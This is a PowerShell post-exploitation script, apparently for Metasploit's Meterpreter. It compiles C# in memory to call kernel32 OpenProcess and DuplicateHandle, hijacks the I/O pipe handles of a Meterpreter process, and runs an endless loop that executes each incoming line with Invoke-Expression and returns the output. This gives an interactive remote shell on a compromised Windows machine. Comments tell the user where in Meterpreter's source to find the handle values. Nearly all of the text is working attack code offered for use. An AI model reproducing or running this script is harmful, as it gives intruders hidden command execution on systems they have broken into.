$a = @"
using System;
using System.Runtime.InteropServices;
namespace kernel32 {
public class func {
[DllImport("kernel32.dll")] public static extern int DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, uint bInheritHandle, uint dwOptions);
[DllImport("kernel32.dll")] public static extern int GetCurrentProcess();
[DllImport("kernel32.dll")] public static extern int OpenProcess(uint desiredaccess, uint inherit, uint procesid);
} }
"@

$c = New-Object Microsoft.CSharp.CSharpCodeProvider
$b = New-Object System.CodeDom.Compiler.CompilerParameters
$b.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$b.GenerateInMemory = $True
$d = $c.CompileAssemblyFromSource($b, $a)

# Replace Process ID with Meterpreter Proc Id
$parentProcessID = 7596
$remote_handle_in = 780
$remote_handle_out = 764

$sourceHandle = [kernel32.func]::OpenProcess(64,1,$parentProcessID);
$cHandle = [kernel32.func]::GetCurrentProcess();


# Replace remote_handle witth in[0] value from process .c
# packet_add_tlv_uint(response, TLV_TYPE_HANDLE, (DWORD)in[0]);
# Dont close the Handle... (Line 543) process .c
# extensions/stdapi/sys/process.rb
# Line 170
# in_handle = response.get_tlv_value(TLV_TYPE_HANDLE)
# puts in_handle.inspect < use this

$handle_in = -1
$res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_in, $cHandle, [ref] $handle_in, 2, 1, 2)
$in_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_in, 1
$fsi = New-Object IO.FileStream $in_handle, ReadWrite
$sr = New-Object IO.StreamReader $fsi

$handle_out = -1
$res = [kernel32.func]::DuplicateHandle($sourceHandle,$remote_handle_out, $cHandle, [ref] $handle_out, 2, 1, 2)
$out_handle = New-Object Microsoft.Win32.SafeHandles.SafeFileHandle $handle_out, 1
$fso = New-Object IO.FileStream $out_handle, ReadWrite
$sw = New-Object IO.StreamWriter $fso
$sw.AutoFlush=1

while (1) {
	$o = IEX ($sr.ReadLine())
	$sw.WriteLine($o)
	$sw.Write("PS>")
}

